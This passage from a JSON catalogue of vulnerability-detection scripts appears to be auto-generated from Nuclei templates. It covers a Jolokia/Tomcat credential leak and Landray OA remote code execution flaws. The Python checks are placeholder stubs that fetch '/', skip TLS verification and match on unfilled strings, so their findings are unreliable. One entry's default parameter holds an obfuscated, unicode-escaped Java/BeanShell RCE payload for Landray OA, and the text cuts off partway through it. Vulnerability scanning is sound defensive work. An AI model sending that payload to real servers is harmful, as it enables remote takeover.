# TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"mbean\":\"Users:database=UserDatabase,type=UserDatabase\", \"users\":\\' | mot(s) \\'\"users\":[]\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"mbean\":\"Users:database=UserDatabase,type=UserDatabase\", \"users\":', '\"users\":[]']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia <= 1.7.1 Information Leakage\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_tomcat_creds_leak(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-tomcat-creds-leak\nName: Jolokia <= 1.7.1 Information Leakage\nSeverity: critical\nDescription: Tomcat's credential disclosure leading to Remote Code Execution via WAR upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_tomcat_creds_leak:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-tomcat-creds-leak\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia <= 1.7.1 Information Leakage\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"mbean\":\"Users:database=UserDatabase,type=UserDatabase\", \"users\":\\' | mot(s) \\'\"users\":[]\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"mbean\":\"Users:database=UserDatabase,type=UserDatabase\", \"users\":', '\"users\":[]']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia <= 1.7.1 Information Leakage\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_tomcat_creds_leak(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "jolokia",
          "tomcat",
          "exposure",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_landray_oa_replaceextend_rce",
        "name": "Landray OA replaceExtend Function - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a remote command execution vulnerability in Lanling OA replaceExtend Method. Use This Method To Move dataxml.jsp To A Dirctory That Can Access Without Auth,Then An attacker can Run Command With this.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{string}}, Execute' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{randstr}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-replaceextend-rce\nName: Landray OA replaceExtend Function - Remote Code Execution\nSeverity: critical\nDescription: There is a remote command execution vulnerability in Lanling OA replaceExtend Method. Use This Method To Move dataxml.jsp To A Dirctory That Can Access Without Auth,Then An attacker can Run Command With this.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_replaceextend_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-replaceextend-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray OA replaceExtend Function - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{string}}, Execute' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}, Execute']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray OA replaceExtend Function - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_replaceextend_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-replaceextend-rce\nName: Landray OA replaceExtend Function - Remote Code Execution\nSeverity: critical\nDescription: There is a remote command execution vulnerability in Lanling OA replaceExtend Method. Use This Method To Move dataxml.jsp To A Dirctory That Can Access Without Auth,Then An attacker can Run Command With this.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_replaceextend_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-replaceextend-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray OA replaceExtend Function - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{string}}, Execute' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}, Execute']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray OA replaceExtend Function - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_replaceextend_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "landray",
          "oa",
          "dataxml",
          "rce",
          "replaceExtend",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_landray_oa_sys_search_main_edit_param_rce",
        "name": "Landray-OA - Remote code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Execute:, {{randstr}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "{\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}&fdParemNames=11&fdParameters=<java><void class=\"bsh.Interpreter\"><void%20method=%22eval%22><string>\\u0020\\u0020\\u0020\\u0020\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u003d\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0028\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0072\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u002e\\u0046\\u0069\\u0065\\u006c\\u0064\\u0020\\u0066\\u0020\\u003d\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0020\\u003d\\u0020\\u0028\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0029\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0067\\u0072\\u006f\\u0075\\u0070\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u0069\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u0069\\u0020\\u003c\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u003b\\u0020\\u0069\\u002b\\u002b\\u0029\\u0020\\u007b\\u0020\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0020\\u0074\\u0020\\u003d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u005b\\u0069\\u005d\\u003b\\u0069\\u0066\\u0020\\u0028\\u0074\\u0020\\u003d\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0028\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0065\\u0078\\u0065\\u0063\\u0022\\u0029\\u0020\\u007c\\u007c\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0022\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0074\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0021\\u0028\\u006f\\u0062\\u006a\\u0020\\u0069\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u006f\\u0066\\u0020\\u0052\\u0075\\u006e\\u006e\\u0061\\u0062\\u006c\\u0065\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0069\\u0073\\u0024\\u0030\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0068\\u0061\\u006e\\u0064\\u006c\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u0046\\u0069\\u0065\\u006c\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0068\\u0061\\u006e\\u0064\\u006c\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u007d\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0053\\u0075\\u0070\\u0065\\u0072\\u0063\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0022\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u0046\\u0069\\u0065\\u006c\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\